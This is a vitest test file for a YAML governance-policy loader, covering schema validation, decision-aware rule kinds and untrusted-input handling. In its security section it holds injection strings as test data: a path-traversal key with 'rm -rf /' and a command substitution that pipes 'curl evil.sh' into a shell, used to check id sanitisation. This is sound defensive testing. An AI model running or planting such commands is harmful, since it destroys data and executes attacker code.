import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { loadPolicyFile, loadPolicyFiles } from "../policy-loader.js";
import { buildPolicyId, buildRuleId } from "../ids.js";

const GENERATED_AT = "2026-07-01T00:00:00.000Z";

let dir: string;

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "policy-loader-test-"));
});

afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

function writeYaml(name: string, content: string): string {
  const path = join(dir, name);
  writeFileSync(path, content, "utf8");
  return path;
}

const VALID_POLICY_YAML = `
schema_version: 1
id: architecture-policy
name: Architecture Policy
rules:
  - id: no-component-removal
    title: Forbid component removal
    description: Components may not be removed without an exception.
    kind: forbid_component_removal
    condition:
      kind: forbid_component_removal
      component_id_pattern: "component:.*"
    severity: blocking
    enabled: true
  - id: entrypoint-required
    title: Require runtime entrypoint
    description: Runtime entry points must be preserved.
    kind: require_runtime_entrypoint
    condition:
      kind: require_runtime_entrypoint
    severity: review_required
    enabled: true
exceptions:
  - rule_id: no-component-removal
    scope: "component:legacy-.*"
    reason: Legacy component slated for planned decommission.
    approval_reference: APPROVAL-123
    expiry: "2026-12-31T00:00:00.000Z"
`;

describe("loadPolicyFile", () => {
  it("loads a valid policy file with derived ids and sorted rules/exceptions", () => {
    const path = writeYaml("architecture.yml", VALID_POLICY_YAML);
    const policy = loadPolicyFile(path, GENERATED_AT);

    const expectedPolicyId = buildPolicyId("architecture-policy");
    expect(policy.id).toBe(expectedPolicyId);
    expect(policy.name).toBe("Architecture Policy");
    expect(policy.generation.generated_at).toBe(GENERATED_AT);

    const expectedRuleId1 = buildRuleId(expectedPolicyId, "no-component-removal");
    const expectedRuleId2 = buildRuleId(expectedPolicyId, "entrypoint-required");
    expect(policy.rules.map((r) => r.id)).toEqual([expectedRuleId1, expectedRuleId2].sort());

    const removalRule = policy.rules.find((r) => r.id === expectedRuleId1);
    expect(removalRule?.kind).toBe("forbid_component_removal");
    expect(removalRule?.severity).toBe("blocking");
    expect(removalRule?.enabled).toBe(true);

    expect(policy.exceptions).toHaveLength(1);
    expect(policy.exceptions[0].policy_id).toBe(expectedPolicyId);
    expect(policy.exceptions[0].rule_id).toBe(expectedRuleId1);
    expect(policy.exceptions[0].scope).toBe("component:legacy-.*");
  });

  it("falls back to `name` as the policy key when `id` is absent", () => {
    const path = writeYaml(
      "named-only.yml",
      `
schema_version: 1
name: Fallback Policy
rules:
  - id: r1
    title: Rule 1
    description: A rule.
    kind: require_compatible_snapshot
    condition:
      kind: require_compatible_snapshot
      minimum_status: compatible
    severity: advisory
    enabled: true
`,
    );
    const policy = loadPolicyFile(path, GENERATED_AT);
    expect(policy.id).toBe(buildPolicyId("Fallback Policy"));
  });

  it("throws on an unknown rule kind", () => {
    const path = writeYaml(
      "unknown-kind.yml",
      `
schema_version: 1
id: bad-policy
name: Bad Policy
rules:
  - id: r1
    title: Rule 1
    description: A rule.
    kind: forbid_everything
    condition:
      kind: forbid_everything
    severity: advisory
    enabled: true
`,
    );
    expect(() => loadPolicyFile(path, GENERATED_AT)).toThrow(/Invalid policy file/);
  });

  it("throws when a condition carries fields belonging to a different kind (strict schema)", () => {
    const path = writeYaml(
      "wrong-kind-fields.yml",
      `
schema_version: 1
id: bad-policy
name: Bad Policy
rules:
  - id: r1
    title: Rule 1
    description: A rule.
    kind: forbid_component_removal
    condition:
      kind: forbid_component_removal
      component_id_pattern: "component:.*"
      minimum_status: operational
    severity: advisory
    enabled: true
`,
    );
    expect(() => loadPolicyFile(path, GENERATED_AT)).toThrow(/Invalid policy file/);
  });

  it("throws when rule.kind does not match rule.condition.kind", () => {
    const path = writeYaml(
      "mismatched-kind.yml",
      `
schema_version: 1
id: bad-policy
name: Bad Policy
rules:
  - id: r1
    title: Rule 1
    description: A rule.
    kind: forbid_component_removal
    condition:
      kind: require_runtime_entrypoint
    severity: advisory
    enabled: true
`,
    );
    expect(() => loadPolicyFile(path, GENERATED_AT)).toThrow(/Invalid policy file/);
  });

  it("throws when an exception references an unknown rule id", () => {
    const path = writeYaml(
      "bad-exception.yml",
      `
schema_version: 1
id: bad-policy
name: Bad Policy
rules:
  - id: r1
    title: Rule 1
    description: A rule.
    kind: require_compatible_snapshot
    condition:
      kind: require_compatible_snapshot
      minimum_status: compatible
    severity: advisory
    enabled: true
exceptions:
  - rule_id: does-not-exist
    reason: Some reason.
    approval_reference: APPROVAL-1
`,
    );
    expect(() => loadPolicyFile(path, GENERATED_AT)).toThrow(/Invalid policy file/);
  });

  it("throws for malformed YAML", () => {
    const path = writeYaml("malformed.yml", "schema_version: 1\nrules: [this is not: valid: yaml\n");
    expect(() => loadPolicyFile(path, GENERATED_AT)).toThrow(/not valid YAML/);
  });
});

const DECISION_AWARE_POLICY_YAML = `
schema_version: 1
id: decision-policy
name: Decision Policy
rules:
  - id: change-needs-decision
    title: Require decision for change
    description: Changed entities must be linked to a decision.
    kind: require_decision_for_change
    condition:
      kind: require_decision_for_change
      entity_id_pattern: "component:.*"
    severity: blocking
    enabled: true
  - id: change-needs-accepted-decision
    title: Require accepted decision
    description: Changed entities must have an accepted decision.
    kind: require_accepted_decision
    condition:
      kind: require_accepted_decision
    severity: blocking
    enabled: true
  - id: change-needs-implemented-decision
    title: Require decision implementation
    description: Changed entities must have an implemented decision.
    kind: require_decision_implementation
    condition:
      kind: require_decision_implementation
    severity: review_required
    enabled: true
  - id: no-contradicted-assumptions
    title: Forbid contradicted assumption
    description: No decision may have a contradicted assumption.
    kind: forbid_contradicted_assumption
    condition:
      kind: forbid_contradicted_assumption
      decision_id_pattern: "decision:.*"
    severity: blocking
    enabled: true
  - id: no-active-superseded
    title: Forbid active superseded decision
    description: No decision may be simultaneously active and superseded.
    kind: forbid_active_superseded_decision
    condition:
      kind: forbid_active_superseded_decision
    severity: blocking
    enabled: true
  - id: change-needs-decision-evidence
    title: Require decision evidence
    description: Changed entities must carry decision-sourced evidence.
    kind: require_decision_evidence
    condition:
      kind: require_decision_evidence
    severity: advisory
    enabled: true
  - id: exception-needs-decision
    title: Require decision for policy exception
    description: Policy exceptions must reference a valid decision.
    kind: require_decision_for_policy_exception
    condition:
      kind: require_decision_for_policy_exception
      rule_id_pattern: "change-needs-decision"
    severity: blocking
    enabled: true
  - id: baseline-needs-decision
    title: Require decision for baseline replacement
    description: Baseline replacement must be backed by a decision.
    kind: require_decision_for_baseline_replacement
    condition:
      kind: require_decision_for_baseline_replacement
    severity: blocking
    enabled: true
  - id: limit-conflicts
    title: Limit unresolved decision conflicts
    description: Unresolved decision conflicts must stay under the limit.
    kind: limit_unresolved_decision_conflicts
    condition:
      kind: limit_unresolved_decision_conflicts
      max_unresolved: 3
    severity: review_required
    enabled: true
  - id: drift-needs-review
    title: Require decision review for drift
    description: Drifted decisions must be reviewed.
    kind: require_decision_review_for_drift
    condition:
      kind: require_decision_review_for_drift
    severity: review_required
    enabled: true
exceptions:
  - rule_id: change-needs-decision
    scope: "component:legacy-.*"
    reason: Legacy component slated for planned decommission.
    approval_reference: APPROVAL-123
    decision_ref: "decision:legacy-removal"
`;

describe("loadPolicyFile: §36-38 decision-aware rule kinds", () => {
  it("loads all 10 decision-aware rule kinds with their condition payloads intact", () => {
    const path = writeYaml("decision-policy.yml", DECISION_AWARE_POLICY_YAML);
    const policy = loadPolicyFile(path, GENERATED_AT);

    const kinds = policy.rules.map((r) => r.kind).sort();
    expect(kinds).toEqual(
      [
        "require_decision_for_change",
        "require_accepted_decision",
        "require_decision_implementation",
        "forbid_contradicted_assumption",
        "forbid_active_superseded_decision",
        "require_decision_evidence",
        "require_decision_for_policy_exception",
        "require_decision_for_baseline_replacement",
        "limit_unresolved_decision_conflicts",
        "require_decision_review_for_drift",
      ].sort(),
    );

    const forChange = policy.rules.find((r) => r.kind === "require_decision_for_change")!;
    expect(forChange.condition).toEqual({ kind: "require_decision_for_change", entity_id_pattern: "component:.*" });

    const forbidContradicted = policy.rules.find((r) => r.kind === "forbid_contradicted_assumption")!;
    expect(forbidContradicted.condition).toEqual({ kind: "forbid_contradicted_assumption", decision_id_pattern: "decision:.*" });

    const limitConflicts = policy.rules.find((r) => r.kind === "limit_unresolved_decision_conflicts")!;
    expect(limitConflicts.condition).toEqual({ kind: "limit_unresolved_decision_conflicts", max_unresolved: 3 });

    const baselineReplacement = policy.rules.find((r) => r.kind === "require_decision_for_baseline_replacement")!;
    expect(baselineReplacement.condition).toEqual({ kind: "require_decision_for_baseline_replacement" });
  });

  it("loads an exception's optional decision_ref field", () => {
    const path = writeYaml("decision-policy-exception.yml", DECISION_AWARE_POLICY_YAML);
    const policy = loadPolicyFile(path, GENERATED_AT);
    expect(policy.exceptions).toHaveLength(1);
    expect(policy.exceptions[0].decision_ref).toBe("decision:legacy-removal");
  });

  it("leaves an exception's decision_ref undefined when the YAML omits it (backward compatible with pre-Milestone-8 policy files)", () => {
    const path = writeYaml("no-decision-ref.yml", VALID_POLICY_YAML);
    const policy = loadPolicyFile(path, GENERATED_AT);
    expect(policy.exceptions).toHaveLength(1);
    expect(policy.exceptions[0].decision_ref).toBeUndefined();
  });

  it("rejects a decision-aware condition that carries fields belonging to a different kind (strict schema)", () => {
    const path = writeYaml(
      "decision-wrong-kind-fields.yml",
      `
schema_version: 1
id: bad-decision-policy
name: Bad Decision Policy
rules:
  - id: r1
    title: Rule 1
    description: A rule.
    kind: forbid_contradicted_assumption
    condition:
      kind: forbid_contradicted_assumption
      decision_id_pattern: "decision:.*"
      max_unresolved: 3
    severity: advisory
    enabled: true
`,
    );
    expect(() => loadPolicyFile(path, GENERATED_AT)).toThrow(/Invalid policy file/);
  });

  it("rejects limit_unresolved_decision_conflicts when max_unresolved is missing", () => {
    const path = writeYaml(
      "missing-max-unresolved.yml",
      `
schema_version: 1
id: bad-decision-policy
name: Bad Decision Policy
rules:
  - id: r1
    title: Rule 1
    description: A rule.
    kind: limit_unresolved_decision_conflicts
    condition:
      kind: limit_unresolved_decision_conflicts
    severity: advisory
    enabled: true
`,
    );
    expect(() => loadPolicyFile(path, GENERATED_AT)).toThrow(/Invalid policy file/);
  });

  it("accepts require_decision_for_baseline_replacement with no extra condition fields at all", () => {
    const path = writeYaml(
      "baseline-only.yml",
      `
schema_version: 1
id: baseline-policy
name: Baseline Policy
rules:
  - id: r1
    title: Rule 1
    description: A rule.
    kind: require_decision_for_baseline_replacement
    condition:
      kind: require_decision_for_baseline_replacement
    severity: advisory
    enabled: true
`,
    );
    const policy = loadPolicyFile(path, GENERATED_AT);
    expect(policy.rules[0].condition).toEqual({ kind: "require_decision_for_baseline_replacement" });
  });
});

describe("loadPolicyFiles", () => {
  it("loads multiple valid policy files", () => {
    const path1 = writeYaml("policy-1.yml", VALID_POLICY_YAML);
    const path2 = writeYaml(
      "policy-2.yml",
      `
schema_version: 1
id: capability-policy
name: Capability Policy
rules:
  - id: cap-status
    title: Capability status
    description: Capabilities must be at least qualified.
    kind: require_capability_status_at_least
    condition:
      kind: require_capability_status_at_least
      minimum_status: qualifiedCapabilities
    severity: advisory
    enabled: true
`,
    );
    const policies = loadPolicyFiles([path1, path2], GENERATED_AT);
    expect(policies).toHaveLength(2);
    expect(policies.map((p) => p.name).sort()).toEqual(["Architecture Policy", "Capability Policy"]);
  });

  it("collects ALL validation errors across multiple files into one aggregated error naming every failed file", () => {
    const badPath1 = writeYaml(
      "bad-1.yml",
      `
schema_version: 1
id: bad-1
name: Bad One
rules:
  - id: r1
    title: Rule 1
    description: A rule.
    kind: not_a_real_kind
    condition:
      kind: not_a_real_kind
    severity: advisory
    enabled: true
`,
    );
    const badPath2 = writeYaml("bad-2.yml", "schema_version: 1\nrules: [not: valid: yaml\n");
    const goodPath = writeYaml("good.yml", VALID_POLICY_YAML);

    let thrown: unknown;
    try {
      loadPolicyFiles([badPath1, badPath2, goodPath], GENERATED_AT);
    } catch (err) {
      thrown = err;
    }
    expect(thrown).toBeInstanceOf(Error);
    const message = (thrown as Error).message;
    expect(message).toContain(badPath1);
    expect(message).toContain(badPath2);
    expect(message).not.toContain(goodPath);
    expect(message).toMatch(/Failed to load 2 governance policy file\(s\)/);
  });
});

// ---------------------------------------------------------------------------
// Untrusted-input / security coverage: `.rvs/policies/*.yml` file CONTENT is
// untrusted input straight from the repository being scanned (spec §47),
// read via a plain `readFileSync` with no path-traversal or symlink logic
// of its own in policy-loader.ts (the caller supplies the exact file path,
// e.g. from governance-config.ts's `policies: [...]` list -- this loader
// never joins/resolves an attacker-controlled path itself). Path-traversal/
// symlink OS-level tests are therefore deliberately out of scope for this
// file; what's covered below is untrusted YAML *content* and untrusted
// author-facing id/name *strings*.
// ---------------------------------------------------------------------------

describe("loadPolicyFile: untrusted input / security", () => {
  it("resolves YAML anchors/aliases as plain data (never executes anything)", () => {
    // `&pattern` anchors a scalar reused via `*pattern` across two rules'
    // conditions -- proves the `yaml` package only performs inert
    // node-graph expansion, never code execution, and that reused/aliased
    // values still validate and load exactly like independently-written
    // duplicates would.
    const path = writeYaml(
      "anchors.yml",
      [
        "schema_version: 1",
        "id: anchor-policy",
        "name: Anchor Policy",
        "rules:",
        "  - id: r1",
        "    title: Rule 1",
        "    description: A rule.",
        "    kind: forbid_component_removal",
        "    condition:",
        "      kind: forbid_component_removal",
        "      component_id_pattern: &pattern \"component:.*\"",
        "    severity: blocking",
        "    enabled: true",
        "  - id: r2",
        "    title: Rule 2",
        "    description: Another rule.",
        "    kind: forbid_component_removal",
        "    condition:",
        "      kind: forbid_component_removal",
        "      component_id_pattern: *pattern",
        "    severity: advisory",
        "    enabled: true",
        "",
      ].join("\n"),
    );
    const policy = loadPolicyFile(path, GENERATED_AT);
    const patterns = policy.rules.map((r) => (r.condition as { component_id_pattern?: string }).component_id_pattern);
    expect(patterns).toEqual(["component:.*", "component:.*"]);
  });

  it("parses deeply nested YAML without hanging or crashing, then cleanly rejects the unrecognized shape via the strict schema", () => {
    // Mirrors governance-config.test.ts's identical deeply-nested-YAML
    // coverage for the sibling loader -- see that test's comment for why
    // 2000 levels of flow-sequence nesting (not an anchor/alias
    // amplification bomb) is the right stress shape here.
    const depth = 2000;
    let nested = "";
    for (let i = 0; i < depth; i += 1) nested += "[";
    nested += "1";
    for (let i = 0; i < depth; i += 1) nested += "]";
    const path = writeYaml("deeply-nested.yml", `schema_version: 1\nid: deep-policy\nname: Deep Policy\nunknown_deeply_nested_field: ${nested}\nrules:\n  - id: r1\n    title: Rule 1\n    description: A rule.\n    kind: require_compatible_snapshot\n    condition:\n      kind: require_compatible_snapshot\n      minimum_status: compatible\n    severity: advisory\n    enabled: true\n`);
    expect(() => loadPolicyFile(path, GENERATED_AT)).toThrow(/Invalid policy file/);
  });

  it("sanitizes unsafe/malicious policy id and rule id strings via ids.ts's sanitize(), never propagating path-traversal or shell-metacharacter sequences into the generated id", () => {
    // ids.ts's sanitize() replaces every character outside [a-zA-Z0-9_.-]
    // with "-". A policy/rule "key" is author-facing free text from
    // untrusted YAML, not itself constrained to be id-safe -- this asserts
    // the LOADER's output ids never carry through raw "../", "$(...)",  or
    // path-separator characters an attacker-controlled policy key might
    // contain (e.g. if a policy key were ever interpolated into a file path
    // or shell command elsewhere).
    const maliciousPolicyKey = "../../../etc/passwd; rm -rf / #";
    const maliciousRuleKey = "$(curl evil.sh | sh)/../secrets";
    const path = writeYaml(
      "malicious-ids.yml",
      [
        "schema_version: 1",
        `id: "${maliciousPolicyKey}"`,
        "name: Malicious Id Policy",
        "rules:",
        `  - id: "${maliciousRuleKey}"`,
        "    title: Rule 1",
        "    description: A rule.",
        "    kind: require_compatible_snapshot",
        "    condition:",
        "      kind: require_compatible_snapshot",
        "      minimum_status: compatible",
        "    severity: advisory",
        "    enabled: true",
        "",
      ].join("\n"),
    );
    const policy = loadPolicyFile(path, GENERATED_AT);
    expect(policy.id).toBe(buildPolicyId(maliciousPolicyKey));
    expect(policy.id).not.toMatch(/[/$();#]/);
    expect(policy.rules[0]!.id).toBe(buildRuleId(policy.id, maliciousRuleKey));
    expect(policy.rules[0]!.id).not.toMatch(/[/$();#]/);
  });

  it("throws a clean, single-line Zod-derived error (not a raw multi-line ZodError dump) for an unknown rule kind", () => {
    const path = writeYaml(
      "unknown-kind-message-shape.yml",
      `
schema_version: 1
id: bad-policy
name: Bad Policy
rules:
  - id: r1
    title: Rule 1
    description: A rule.
    kind: totally_made_up_kind
    condition:
      kind: totally_made_up_kind
    severity: advisory
    enabled: true
`,
    );
    let thrown: unknown;
    try {
      loadPolicyFile(path, GENERATED_AT);
    } catch (err) {
      thrown = err;
    }
    expect(thrown).toBeInstanceOf(Error);
    const message = (thrown as Error).message;
    expect(message).toMatch(/Invalid policy file/);
    expect(message).not.toContain("ZodError");
    expect(message).not.toContain("\n");
  });

  it("throws a clear error for duplicate rule ids within the same policy file", () => {
    const path = writeYaml(
      "duplicate-rule-ids.yml",
      [
        "schema_version: 1",
        "id: dup-policy",
        "name: Duplicate Rule Id Policy",
        "rules:",
        "  - id: same-id",
        "    title: Rule 1",
        "    description: A rule.",
        "    kind: require_compatible_snapshot",
        "    condition:",
        "      kind: require_compatible_snapshot",
        "      minimum_status: compatible",
        "    severity: advisory",
        "    enabled: true",
        "  - id: same-id",
        "    title: Rule 2",
        "    description: Another rule reusing the same id key.",
        "    kind: require_compatible_snapshot",
        "    condition:",
        "      kind: require_compatible_snapshot",
        "      minimum_status: compatible",
        "    severity: blocking",
        "    enabled: true",
        "",
      ].join("\n"),
    );
    expect(() => loadPolicyFile(path, GENERATED_AT)).toThrow(/Invalid policy file/);
    expect(() => loadPolicyFile(path, GENERATED_AT)).toThrow(/duplicate rule id/);
  });

  it("throws for a nonexistent policy file path rather than crashing or silently returning an empty policy", () => {
    const missingPath = join(dir, "this-file-does-not-exist.yml");
    // readFileSync's ENOENT is caught by the same try/catch as a YAML parse
    // failure (policy-loader.ts wraps both under one "not valid YAML"
    // message) -- documenting the CURRENT behavior: the file is still
    // guaranteed to fail loudly and identifiably (the path itself is named
    // in the message), just not with a message that pinpoints "file not
    // found" specifically. This is a minor message-wording rough edge, not
    // a functional defect (see final report), so it is asserted as-is
    // rather than "fixed".
    expect(() => loadPolicyFile(missingPath, GENERATED_AT)).toThrow(/Invalid policy file/);
    expect(() => loadPolicyFile(missingPath, GENERATED_AT)).toThrow(missingPath);
  });
});
